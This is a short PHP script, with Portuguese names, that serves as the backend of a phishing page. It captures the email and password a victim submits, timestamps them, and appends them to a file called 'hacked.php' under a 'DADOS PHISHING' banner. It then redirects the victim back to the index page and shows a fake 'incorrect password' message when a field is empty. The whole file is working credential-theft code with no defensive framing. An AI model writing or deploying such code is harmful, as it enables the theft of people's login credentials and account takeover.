<?php

function Escrever(){
    
if(isset($_POST['enviar'])){
    $data = date("H:i:s d/m/Y");
//$porta = $_SERVER["'REMOTE_PORT'"];

//$ip = $_SERVER["REMOTE_ADD­R"];
$dados = array(

"email" => $_POST["email"],
"senha" => $_POST["senha"],
"data" => $data
);
if(ltrim(empty($dados['email'])) or ltrim(empty($dados['senha']))){

echo "<span style='color: red;'>Senha ou e-mail incorreto </span>"; }
else{

$arquivo = "hacked.php";
$abrir = fopen($arquivo, "a");
fwrite($abrir, "<meta charset= 'utf-8'>");
fwrite($abrir, "<body>");

fwrite($abrir, "<center><div style='background-color:#0­00000; font-family:monospac­e; font-size:16px;'>");
fwrite($abrir, "<span style='color:red;'> =========== DADOS PHISHING ============</­span> <br>");
//echo "<span style='color: green;'> Obrigado! enviamos um email para ".$dados["email"]." para cocnluíres o processo ."; 
header("location: index.php");


foreach ($dados as $key => $value) {
$phishing = "<span style=' background-color:#000; color: #fafafa;margin-left:­4px;'>".$key." : <b style='color: #34A853;'</­b>".$value." <span> <br>";
// criando o arquivo para escrita
fwrite($abrir, $phishing);

}
fwrite($abrir, "</div><br></center>");
}

}else{
­header("location:inde­x.php");
}
}


Escrever();


